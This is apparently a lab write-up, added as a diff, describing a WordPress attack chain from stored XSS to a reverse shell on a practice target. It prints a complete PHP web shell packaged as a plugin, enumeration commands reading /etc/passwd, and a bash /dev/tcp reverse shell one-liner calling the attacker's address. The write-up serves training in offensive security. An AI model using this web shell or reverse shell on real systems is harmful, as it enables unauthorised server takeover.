@@ -1,0 +1,195 @@
+# Capstone Lab - XSS to Reverse Shell (WordPress)
+
+## Objective
+
+The goal of this lab was to:
+
+* Exploit a Stored XSS vulnerability to create a new administrator account
+* Upload a malicious WordPress plugin to gain code execution
+* Upgrade a web shell to a reverse shell
+* Capture the flag from the target system
+
+---
+
+## Target Information
+
+| Field             | Value           |
+| ----------------- | --------------- |
+| IP                | 192.168.193.16  |
+| Hostname          | offsecwp        |
+| CMS               | WordPress 5.8.3 |
+| Web Server        | Apache 2.4.51   |
+| PHP               | 7.4.27          |
+| Vulnerable Plugin | Visitors v0.3   |
+| Shell User        | www-data        |
+
+---
+
+## Step 1 - Stored XSS Exploitation
+
+A Stored XSS payload was injected via the User-Agent header:
+
+curl -s http://offsecwp/ -H "User-Agent: <script>eval(String.fromCharCode(...))</script>"
+
+The payload was executed when an administrator viewed the Visitors page:
+
+http://offsecwp/wp-admin/admin.php?page=visitors-app
+
+### Result
+
+A new administrator account was created:
+
+* Username: zdnet
+* Password: (created via payload)
+* Role: Administrator
+
+### Payload Logic
+
+The JavaScript payload:
+
+* Requested `/wp-admin/user-new.php`
+* Extracted a nonce value
+* Submitted a POST request to create a new admin user
+
+---
+
+## Step 2 - Malicious Plugin Creation
+
+A custom WordPress plugin containing a web shell was created:
+
+mkdir /tmp/webshell
+
+cat > /tmp/webshell/webshell.php << 'EOF'
+
+<?php
+/*
+Plugin Name: Web Shell
+*/
+if(isset($_GET['cmd'])) {
+    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
+}
+?>
+
+EOF
+
+cd /tmp/webshell
+zip webshell.zip webshell.php
+
+---
+
+## Step 3 - Plugin Upload and Activation
+
+Accessed:
+
+http://offsecwp/wp-admin/plugin-install.php
+
+Steps:
+
+1. Upload plugin (webshell.zip)
+2. Install plugin
+3. Activate plugin
+
+---
+
+## Step 4 - Command Execution (Web Shell)
+
+Tested the web shell:
+
+curl "http://offsecwp/wp-content/plugins/webshell/webshell.php?cmd=id"
+
+### Output
+
+uid=33(www-data) gid=33(www-data)
+
+---
+
+## Step 5 - Enumeration
+
+Executed commands via web shell:
+
+* System information:
+  uname -a
+
+* List temporary directory:
+  ls -la /tmp/
+
+* View users:
+  cat /etc/passwd
+
+---
+
+## Step 6 - Reverse Shell
+
+Started listener:
+
+nc -lvnp 4444
+
+Triggered reverse shell:
+
+curl "http://offsecwp/wp-content/plugins/webshell/webshell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.45.229/4444+0>%261'"
+
+### Result
+
+Received reverse shell as:
+
+www-data
+
+---
+
+## Step 7 - Flag Retrieval
+
+Navigated to:
+
+/tmp/
+
+Commands:
+
+ls -la /tmp/
+cat /tmp/flag
+
+---
+
+## Attack Chain Summary
+
+1. Stored XSS via User-Agent header
+2. Payload stored in database
+3. Admin views page → payload executed
+4. New admin account created
+5. Login as new admin
+6. Upload malicious plugin
+7. Execute commands via web shell
+8. Upgrade to reverse shell
+9. Retrieve flag
+
+---
+
+## Key Concepts
+
+* Stored XSS can lead to full account compromise
+* JavaScript can automate privileged actions using authenticated sessions
+* WordPress plugin upload can lead to remote code execution
+* Web shells provide limited access and should be upgraded
+* Reverse shells provide better interaction and control
+* The www-data user typically runs web services on Linux systems
+
+---
+
+## Tools Used
+
+* curl → send requests and execute commands
+* netcat → reverse shell listener
+* zip → package plugin
+* browser → trigger XSS
+
+---
+
+## Summary
+
+This lab demonstrated how a Stored XSS vulnerability can escalate into full system compromise by chaining:
+
+* client-side exploitation
+* privilege escalation (admin creation)
+* remote code execution
+* interactive shell access
+
+---
